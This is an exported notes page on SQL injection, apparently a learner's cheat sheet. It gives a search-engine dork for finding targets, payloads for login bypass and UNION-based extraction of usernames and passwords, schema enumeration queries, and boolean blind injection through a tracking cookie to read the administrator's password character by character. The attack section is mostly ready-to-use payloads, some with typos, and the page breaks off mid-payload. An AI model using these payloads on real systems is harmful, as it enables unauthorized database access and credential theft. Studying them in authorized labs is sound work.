<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>SQLi</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-default_background {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 237, 214, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 237, 214, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(249, 228, 188, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="6524395b-e0e9-4ecc-8fb7-1ee9089d9237" class="page sans"><header><h1 class="page-title">SQLi</h1><p class="page-description"></p></header><div class="page-body"><h1 id="a40a0dd8-56aa-45dc-9d52-7016f4511703" class="">How To Identify SQLi</h1><ul id="abc1e9b2-7bdb-4c24-92a7-e2664df77d34" class="bulleted-list"><li style="list-style-type:disc">To find injection points use this dork= site:target inurl:?id=</li></ul><ul id="ce2db1e0-88e8-42c9-a880-c3b5e1141dbe" class="toggle"><li><details open=""><summary>Common injection points</summary><ul id="04f282db-573f-48f9-b730-9a00f0797fce" class="bulleted-list"><li style="list-style-type:disc">login forms</li></ul><ul id="e2d68719-bab3-4dc3-bb45-d2866ac30260" class="bulleted-list"><li style="list-style-type:disc">search box</li></ul><ul id="d118cdef-71eb-4ed2-8d69-cee9141b5932" class="bulleted-list"><li style="list-style-type:disc">URL parameters</li></ul><ul id="fa135c67-563a-46c9-86ff-54d91b6e0b59" class="bulleted-list"><li style="list-style-type:disc">Cookies</li></ul><ul id="087558d6-e3f9-45c7-9122-c73dcd639520" class="bulleted-list"><li style="list-style-type:disc">Hidden fields in HTML forms</li></ul></details></li></ul><ul id="8e09f81b-fb0d-44a3-916c-39fe1cb61a8d" class="toggle"><li><details open=""><summary>Auth</summary><ul id="f944e50d-11de-45c2-9ce0-178bed4945dd" class="bulleted-list"><li style="list-style-type:disc">For everything true : %’or’1’=’1</li></ul><ul id="47d284cf-df5d-4b19-98b2-acb4f7965a93" class="bulleted-list"><li style="list-style-type:disc">display name of DB with version: %’or 0=0 union select null,version()#</li></ul><ul id="ed3c8d27-8390-4c73-99fb-fd2a7a194f63" class="bulleted-list"><li style="list-style-type:disc">display all the tables present in information_schema by the following script: %’and 1=0 union select null,table_name from information_schema.tables#</li></ul><ul id="2ac1a030-0f44-48f7-b816-16c9b3dddf9a" class="bulleted-list"><li style="list-style-type:disc">display all the coloumn fields in information_schema users table by the following script: %’and 1=0 union select null,concat(table_name,0x0a,coloumn_name) information_schema.coloumns where table_name=’users’#</li></ul><ul id="81806239-1da9-416d-9074-44715c0090bf" class="bulleted-list"><li style="list-style-type:disc">Display all the coloumns dield contents in the information_schema user table : %’and 1=0 union select null,concat(first_name,0x0a,last_name.0x0a,user,0x0a,password) from users#</li></ul></details></li></ul><ul id="e6713da5-cdf9-4c2b-bbca-02be961e9755" class="toggle"><li><details open=""><summary>Detect SQLi</summary><ul id="e5e51633-b03a-4eb6-a6aa-088395a9bb66" class="bulleted-list"><li style="list-style-type:disc">‘</li></ul><ul id="4b134338-c29e-4713-87a5-02a8c34e784b" class="bulleted-list"><li style="list-style-type:disc">or 1=1 and or 1=2 : look for any change in response</li></ul><ul id="4bfc81e9-e5d0-4688-a116-ad126861fe5a" class="bulleted-list"><li style="list-style-type:disc">some payload</li></ul></details></li></ul><ul id="740e93da-f1c8-46b4-b56e-b0293c3ff02c" class="bulleted-list"><li style="list-style-type:disc">‘- -: comment down the rest</li></ul><ul id="5f90aebe-3e95-4b95-b447-98fe6527433f" class="bulleted-list"><li style="list-style-type:disc">Gifts&#x27;+OR+1=1—: in URL query </li></ul><h2 id="8719f9b0-cb41-48c2-a1d5-7a7a450c8000" class="">In BAND SQLi</h2><ul id="c71e1d2e-38c8-45ee-8d41-64e2123a4310" class="toggle"><li><details open=""><summary>UNION ATTACK </summary><ul id="a11a2ade-9def-4ae8-80b1-dd858066e223" class="bulleted-list"><li style="list-style-type:disc">Requirements<ul id="8b1d793a-6683-489e-9170-8c800713777a" class="bulleted-list"><li style="list-style-type:circle">no of columns in the union select query should be same as the no of column in the original query</li></ul><ul id="59cd72e7-efb2-4578-b2d8-02447d1de089" class="bulleted-list"><li style="list-style-type:circle">The data types in each column must be same as and in same order as that of the original query</li></ul></li></ul><ul id="033cfb69-94a9-42d7-a75b-0babaa3d7fa6" class="toggle"><li><details open=""><summary>Determine no of coloumns</summary><ul id="886484e3-9126-40ba-aff0-881933c78870" class="bulleted-list"><li style="list-style-type:disc">Determine no of coloumns<ul id="b5305550-c61e-4199-ab20-c35b4d258f45" class="bulleted-list"><li style="list-style-type:circle">Check using OrderBy clause will give error when out of column error occur</li></ul><p id="6b9c4370-59f1-42c7-9e64-547f3951778d" class="">&#x27; ORDER BY 1--<br/>&#x27; ORDER BY 2--<br/>&#x27; ORDER BY 3--<br/></p></li></ul><ul id="00e0ca7b-b6c4-4ac7-80a0-cce9d0c1e9ae" class="bulleted-list"><li style="list-style-type:disc">Determine the no of columns 2<ul id="31e5ca5c-b27c-4f1a-b303-52235f3db7ed" class="bulleted-list"><li style="list-style-type:circle">check using null data type as argument when this no reaches the no of columns it don’t give any error</li></ul><p id="5878c0b3-b7b6-420a-b0e5-603db1b8aec4" class="">&#x27; UNION SELECT NULL--<br/>&#x27; UNION SELECT NULL,NULL--<br/>&#x27; UNION SELECT NULL,NULL,NULL--<br/>etc.<br/></p><p id="d886d491-9f11-4ed2-a342-8897ae3637f6" class=""><em>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.</em></p></li></ul><ul id="c956d780-6b9e-4dc0-9730-636d93b4aad4" class="bulleted-list"><li style="list-style-type:disc">For Oracle : &#x27; UNION SELECT NULL FROM DUAL— : dual is a inbuilt table in oracle</li></ul></details></li></ul><ul id="0834f9b3-14ef-4f01-8125-cbdd4ce7956a" class="toggle"><li><details open=""><summary>Finding columns with a useful data</summary><ul id="cb4ced07-bcca-4e23-9459-ef2262c8edaa" class="bulleted-list"><li style="list-style-type:disc">useful data is generally stored in the string data type so look for it using the union select payload<p id="83876644-824f-4047-9585-edbaa267f20b" class="">&#x27; UNION SELECT &#x27;a&#x27;,NULL,NULL,NULL--<br/>&#x27; UNION SELECT NULL,&#x27;a&#x27;,NULL,NULL--<br/>&#x27; UNION SELECT NULL,NULL,&#x27;a&#x27;,NULL--<br/>&#x27; UNION SELECT NULL,NULL,NULL,&#x27;a&#x27;--<br/></p><p id="9b9044c3-c6b3-4a68-9d9a-8566f6250767" class=""><em>You will get a database error if the column has not string datatype</em></p><p id="e2b2e7b9-0584-4c74-b733-9c4beda864fb" class="">
</p></li></ul></details></li></ul><ul id="4636b03b-bdc2-4d91-a980-e7963f95ce56" class="toggle"><li><details open=""><summary>Attack for users and password</summary><ul id="cc1fbbd6-8525-4a22-a09f-25ea38e69519" class="bulleted-list"><li style="list-style-type:disc">The original query returns two columns, both of which can hold string data.</li></ul><ul id="7e8f0ae7-da38-4f06-a9a7-1374c38e2cfb" class="bulleted-list"><li style="list-style-type:disc">The injection point is a quoted string within the <code>WHERE</code> clause.</li></ul><ul id="285f2f36-7628-4fb4-8cc5-e0aaeb89021e" class="bulleted-list"><li style="list-style-type:disc">The database contains a table called <code>users</code> with the columns <code>username</code> and <code>password</code>.</li></ul><p id="da20c38a-700d-499f-ba3c-93bb793448ec" class="">In this example, you can retrieve the contents of the <code>users</code> table by submitting the input:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4b065709-3d84-47be-a8af-44b0014c0bd5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&#x27; UNION SELECT username, password FROM users--</code></pre><ul id="c0afedf0-d5fa-469f-b1e3-99e580a70e74" class="bulleted-list"><li style="list-style-type:disc">If the query only returns on one string column then you can concate two values <ul id="ebf8ed1c-f21c-4f9b-973e-0ff9dcfce085" class="bulleted-list"><li style="list-style-type:circle">&#x27; UNION SELECT username || &#x27;~&#x27; || password FROM user —</li></ul></li></ul></details></li></ul></details></li></ul><ul id="5d1b71f6-ad94-4c70-b7ed-de371e1c687a" class="toggle"><li><details open=""><summary>Examine the database</summary><ul id="97492b77-d117-44fc-a1b2-158e9c5dd902" class="toggle"><li><details open=""><summary>Check Version</summary><p id="c63a21cc-8e80-48f4-abf4-3cfc1b74b80c" class="">&#x27; UNION SELECT @@version— </p><blockquote id="51c24393-5cd6-4eb2-8acd-87e74f3619dc" class=""><table id="b12b6032-d5fc-4eb4-9a0d-7de537c02967" class="simple-table"><tbody><tr id="67f3c5d4-1e6c-4ade-bc98-864624faef2d"><td id="x;&gt;m" class="">Database type</td><td id="~]sA" class="">Query</td></tr><tr id="dbc66bb2-24ee-4357-a6f4-b9b2a8db9ae4"><td id="x;&gt;m" class="">Microsoft, MySQL</td><td id="~]sA" class=""><code>SELECT @@version</code></td></tr><tr id="b6517561-a80e-433f-b458-bb3cf0e4127a"><td id="x;&gt;m" class="">Oracle</td><td id="~]sA" class=""><code>SELECT * FROM v$version</code></td></tr><tr id="1ac6a334-848e-4d1e-bfeb-4f0491fe310c"><td id="x;&gt;m" class="">PostgreSQL</td><td id="~]sA" class=""><code>SELECT version()</code></td></tr></tbody></table></blockquote></details></li></ul><ul id="b5f51145-37ea-40cf-a4c2-41590c7bffb8" class="toggle"><li><details open=""><summary>Check schema of the databses</summary><ul id="9c84f13e-6f6c-46ae-9379-86fa3d1f8da1" class="bulleted-list"><li style="list-style-type:disc">List tables from the database<p id="dd342684-a7ee-4853-b9c3-754150a504b6" class="">SELECT * FROM information_schema.tables</p><p id="b309d95a-1be6-457f-b635-e61fb6e2e723" class="">&#x27;  UNION SELECT table_name,NULL FROM information_schema.tables—</p></li></ul><ul id="3ec3fe26-3fcb-44dd-9ab4-6733cbd681bf" class="bulleted-list"><li style="list-style-type:disc">List of columns of a specific table<p id="4eebf73c-0af6-47db-b739-33003540a1ef" class="">SELECT * FROM information_schema.columns WHERE table_name = ”Users”</p><p id="1ff30c5e-4c0a-4fde-a460-147d00c92bd1" class="">&#x27;+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=&#x27;users_abcdef&#x27;—</p></li></ul></details></li></ul></details></li></ul><h2 id="7ef7e28e-4022-49f3-9efb-808c44b43b56" class="">Blind SQLi</h2><ul id="32de8918-616d-43ab-8ae2-81e331008cc6" class="bulleted-list"><li style="list-style-type:disc">If the site is asking for a session ID or tracking ID or anything like that in the req header like<p id="6db4bfc9-4b55-4eef-8a0d-b63c7133d3f7" class="">Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</p></li></ul><ul id="41a1f7bd-fe84-4fa4-8cfa-4731bf8e2ffc" class="bulleted-list"><li style="list-style-type:disc">The server uses this query to verify the authenticity of the user using the cookie<p id="a9287670-b7fc-4d8f-ae02-ad21b77ccfea" class="">SELECT TrackingId FROM TrackedUsers WHERE TrackingId = &#x27;u5YD3PapBcR4lN3e7Tj4’</p></li></ul><ul id="1429d614-d2c0-408a-9d5e-3c1be71e19c2" class="bulleted-list"><li style="list-style-type:disc">If the cookie or ID verifies it will not give any error or any information about the database it just behaves  differently like “Welcome back &lt;your name&gt;”<p id="f32ae6d7-8d66-4f7d-8cf0-e9ae2addd594" class="">&#x27; AND &#x27;1&#x27;=&#x27;1: adding this after the cookie value we will get a Welcome back msg as the condition is true <br/>&#x27; AND &#x27;1&#x27;=&#x27;2: it will not show any <br/></p></li></ul><ul id="59d71ed0-1b49-4dd0-853e-26fb049406af" class="toggle"><li><details open=""><summary>Attacking Blind SQLi</summary><ul id="c827e6a5-f20a-4cb6-afc1-0c51f6a3dc86" class="bulleted-list"><li style="list-style-type:disc">xyz&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;Administrator&#x27;), position, how many letters to compare) &gt; &#x27;m : substring extract some letters from the string(extracted by the query) then the letter is compared with m if it is greater than m it results true and shows the WELCOME BACK msg i.e. the conditions are true</li></ul><ul id="c3536143-c94d-437e-a672-9f8b1f5c8ff6" class="bulleted-list"><li style="list-style-type:disc">xyz&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;Administrator&#x27;), 1, 1) &gt; &#x27;t</li></ul><p id="2b7b06ba-43ea-46ba-8426-c360fee26373" class="">The <code>SUBSTRING</code> function is called <code>SUBSTR</code> on some types of database<div class="indented"><ul id="2a953bcc-25ca-4564-a144-5d43c221a413" class="toggle"><li><details open=""><summary>Step by Step </summary><ul id="2f9fdf56-eebe-4f59-902b-8b65479cb875" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz&#x27; AND &#x27;1&#x27;=&#x27;1 : check if any welcome msg appears</li></ul><ul id="e98768d8-7aef-43ab-b2c8-6c4890aa4c83" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz&#x27; AND &#x27;1&#x27;=&#x27;2 : check if the welcome msg only available when the condition is TRUE</li></ul><ul id="8803f70f-99ac-48cd-b234-133fb843815f" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz&#x27; AND (SELECT &#x27;a&#x27; FROM users LIMIT 1)=&#x27;a : check if there is a table called users</li></ul><ul id="66082ee1-7574-4263-8693-f285c11be2c5" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz&#x27; AND (SELECT &#x27;a&#x27; FROM users WHERE username=&#x27;administrator&#x27;)=&#x27;a : to check whether administrator user exits or not</li></ul><ul id="376c6ac1-f09f-4514-b859-432e6e85d684" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz&#x27; AND (SELECT &#x27;a&#x27; FROM users WHERE username=&#x27;administrator&#x27; AND 